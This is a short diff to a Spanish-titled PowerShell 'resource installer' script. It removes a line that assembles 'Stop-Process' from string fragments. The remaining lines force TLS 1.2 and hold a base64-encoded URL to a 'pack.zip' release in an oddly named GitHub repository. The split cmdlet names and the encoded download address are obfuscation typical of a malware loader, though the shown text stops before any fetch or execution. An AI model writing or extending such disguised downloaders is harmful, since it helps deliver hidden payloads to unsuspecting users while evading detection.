@@ -1,5 +1,4 @@
 ## Configuración  - Recursos
-##  &("{0}{1}" -f ("Sto"+"p-"),("Proc"+"ess")) -Id $PID -Force
 $Host.UI.RawUI.WindowTitle = " Instalador de Recursos"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $e = "aHR0cHM6Ly9naXRodWIuY29tL1QtcmV4MjEvbGlzZW5jZS9yZWxlYXNlcy9kb3dubG9hZC92MS4wLjAvcGFjay56aXA="
